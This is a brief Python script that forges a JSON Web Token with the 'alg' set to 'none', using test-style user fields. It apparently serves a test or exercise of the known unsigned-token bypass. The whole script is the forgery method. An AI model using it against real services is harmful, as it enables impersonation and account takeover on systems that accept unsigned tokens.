import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {
    "sub": "e82153b0-10d1-70c7-dab9-824d6016be82",
    "email": "test@test.com",
    "nickname": "TestUser"
}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")

token = f"{b64url(header)}.{b64url(payload)}.signature"
print(token)
